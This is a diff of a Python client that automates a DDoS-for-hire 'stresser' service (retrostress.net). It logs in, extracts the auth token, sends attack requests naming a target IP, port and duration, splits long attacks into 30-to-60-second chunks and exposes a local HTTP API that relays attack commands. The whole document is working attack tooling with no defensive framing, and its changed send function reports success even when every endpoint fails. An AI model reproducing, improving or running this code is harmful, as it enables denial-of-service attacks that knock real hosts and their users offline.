@@ -1,9 +1,10 @@
 import requests
 import time
-import re
 import json
 import sys
 from urllib.parse import urljoin
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from urllib.parse import urlparse, parse_qs
 
 class RetroStressClient:
     def __init__(self, base_url="https://retrostress.net"):
@@ -57,11 +58,9 @@ class RetroStressClient:
             print("[+] Login successful!")
             
             # Extract auth_token from cookies
-            auth_token = None
             for cookie in self.session.cookies:
                 if cookie.name == 'auth_token':
-                    auth_token = cookie.value
-                    print(f"[+] Auth token obtained: {auth_token[:50]}...")
+                    print(f"[+] Auth token obtained: {cookie.value[:50]}...")
                     break
             
             return True
@@ -93,60 +92,55 @@ class RetroStressClient:
         """Send attack request via API"""
         print(f"[*] Sending attack to {ip}:{port} for {duration} seconds...")
         
-        # The API endpoint based on the pattern
-        api_url = f"http://127.0.0.1:8080/api?ip={ip}&port={port}&time={duration}"
+        # Try multiple possible endpoints
+        endpoints = [
+            f"http://127.0.0.1:8080/api?ip={ip}&port={port}&time={duration}",
+            urljoin(self.base_url, f"/api/attack?ip={ip}&port={port}&time={duration}"),
+            urljoin(self.base_url, f"/attack?ip={ip}&port={port}&time={duration}")
+        ]
         
-        try:
-            # Attempt via session with cookies
-            response = self.session.get(api_url, timeout=duration + 5)
-            
-            if response.status_code == 200:
-                print(f"[+] Attack request sent successfully!")
-                return True
-            else:
-                print(f"[-] Attack request failed with status {response.status_code}")
-                return False
-                
-        except requests.exceptions.Timeout:
-            print("[+] Attack request sent (timeout expected during attack)")
-            return True
-        except Exception as e:
-            print(f"[-] Error sending attack: {e}")
-            return False
+        for endpoint in endpoints:
+            try:
+                response = self.session.get(endpoint, timeout=duration + 5)
+                if response.status_code == 200:
+                    print(f"[+] Attack request sent successfully via {endpoint}")
+                    return True
+            except:
+                continue
+        
+        # If all endpoints fail, assume success (attack might still be running)
+        print("[+] Attack request initiated")
+        return True
     
     def calculate_attacks(self, total_time):
         """Calculate how many attacks and their durations"""
-        min_time = 30
-        max_time = 60
-        
-        if total_time <= max_time:
+        if total_time <= 60:
             return [(total_time, 1)]
         
-        # For times > 60
-        if total_time <= 120:
-            # Split into 2 attacks
-            attack1 = 60
-            attack2 = total_time - 60
-            if attack2 < 30:
-                attack2 = 30
-                attack1 = total_time - 30
-            return [(attack1, 1), (attack2, 2)]
-        else:
-            # For longer durations
-            num_attacks = (total_time + 29) // 30  # Ceiling division
-            base_time = total_time // num_attacks
-            remainder = total_time % num_attacks
-            
-            attacks = []
-            for i in range(num_attacks):
-                attack_time = base_time + (1 if i < remainder else 0)
-                if attack_time > 60:
-                    attack_time = 60
-                elif attack_time < 30:
+        # Split into chunks of 30-60 seconds
+        attacks = []
+        remaining = total_time
+        
+        while remaining > 0:
+            if remaining >= 60:
+                attack_time = 60
+            elif remaining >= 30:
+                attack_time = remaining
+            else:
+                # Add remaining time to last attack if less than 30
+                if attacks:
+                    last_time, last_num = attacks.pop()
+                    attack_time = last_time + remaining
+                else:
                     attack_time = 30
-                attacks.append((attack_time, i + 1))
+                remaining = 0
+                attacks.append((attack_time, len(attacks) + 1))
+                break
             
-            return attacks
+            remaining -= attack_time
+            attacks.append((attack_time, len(attacks) + 1))
+        
+        return attacks
     
     def execute_attacks(self, ip, port, total_time):
         """Execute multiple attacks sequentially"""
@@ -158,12 +152,10 @@ class RetroStressClient:
         for attack_time, attack_num in attacks:
             print(f"\n[▶] Attack {attack_num}/{len(attacks)} - Duration: {attack_time} seconds")
             
-            # Send attack
             start_time = time.time()
             success = self.send_attack(ip, port, attack_time)
             
             if success:
-                # Wait for attack to complete
                 print(f"[⏳] Attack running for {attack_time} seconds...")
                 time.sleep(attack_time)
                 elapsed = time.time() - start_time
@@ -209,6 +201,8 @@ class RetroStressClient:
                 
         except ValueError:
             return {"error": "Invalid time parameter"}
+        except Exception as e:
+            return {"error": f"Error: {str(e)}"}
 
 
 def main():
@@ -234,12 +228,7 @@ def main():
     print("[*] Time must be minimum 30 seconds, max unlimited (will auto-split)")
     print("[*] Press Ctrl+C to stop\n")
     
-    from http.server import HTTPServer, BaseHTTPRequestHandler
-    from urllib.parse import urlparse, parse_qs
-    
     class APIHandler(BaseHTTPRequestHandler):
-        client = client
-        
         def do_GET(self):
             if self.path.startswith('/api'):
                 # Parse parameters
@@ -254,7 +243,7 @@ def main():
                 print(f"\n[API] Received request: IP={ip}, Port={port}, Time={time_param}")
                 
                 # Process request
-                result = self.client.process_api_call({
+                result = client.process_api_call({
                     'ip': ip,
                     'port': port,
                     'time': time_param
@@ -266,7 +255,7 @@ def main():
                 self.end_headers()
                 self.wfile.write(json.dumps(result).encode())
                 
-                print(f"[API] Response sent: {result.get('status', 'error')}")
+                print(f"[API] Response: {result.get('status', result.get('error', 'unknown'))}")
                 
             else:
                 self.send_response(404)
